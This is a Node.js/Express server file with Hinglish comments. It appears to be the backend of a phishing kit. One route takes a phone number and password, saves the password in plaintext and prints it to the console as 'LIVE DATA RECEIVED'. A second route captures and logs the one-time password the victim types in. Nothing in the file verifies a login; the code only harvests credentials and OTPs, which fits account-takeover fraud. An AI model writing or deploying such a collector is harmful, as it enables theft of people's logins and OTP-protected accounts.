
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();
app.use(express.json());
app.use(cors()); // Iske bina frontend aur backend connect nahi ho paate

// 1. Data Structure (Schema)
const userSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: true },
    password: { type: String, required: true },
    otpEntered: { type: String, default: "" },
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// 2. Database Server Initialization Function
async function startServer() {
    try {
        // Yeh line bina Windows service ke automatic internal database chalu karegi
        const mongoServer = await MongoMemoryServer.create();
        const mongoUri = mongoServer.getUri();
        
        await mongoose.connect(mongoUri);
        console.log('\n====================================');
        console.log('🎉 MongoDB (In-Memory) Connected Successfully!');
        console.log('====================================');

        // Server ko port 5500 par live sunne ke liye active karein
        app.listen(4000, () => {
            console.log('🚀 Backend Server running on port 4000');
            console.log('Aapka backend puri tarah ready hai!');
            console.log('====================================\n');
        });
    } catch (err) {
        console.error('❌ Database Connection Error:', err);
    }
}

// 3. API Route: Login Data Receive Karne Ke Liye
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        
        // Data ko database mein hamesha ke liye save karein
        const newUser = new User({ phoneNumber, password });
        const savedUser = await newUser.save();
        
        // TERMINAL PAR LIVE DATA DEKHNE KE LIYE
        console.log(`\n[🔥 LIVE DATA RECEIVED]`);
        console.log(`📱 Phone Number : ${phoneNumber}`);
        console.log(`🔑 Password     : ${password}`);
        console.log(`------------------------------------`);
        
        res.status(200).json({ success: true, userId: savedUser._id });
    } catch (error) {
        res.status(500).json({ success: false, message: "Server Error" });
    }
});

// 4. API Route: OTP Receive aur Update Karne Ke Liye
app.post('/api/otp-submit', async (req, res) => {
    try {
        const { userId, otp } = req.body;
        
        // Purane user data ke andar OTP ko update karein
        await User.findByIdAndUpdate(userId, { otpEntered: otp });
        
        console.log(`[🔑 OTP UPDATED SUCCESSFULLY]`);
        console.log(`🆔 User ID : ${userId}`);
        console.log(`🔐 OTP     : ${otp}`);
        console.log('====================================');
        
        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: "Server Error" });
    }
});
startServer();
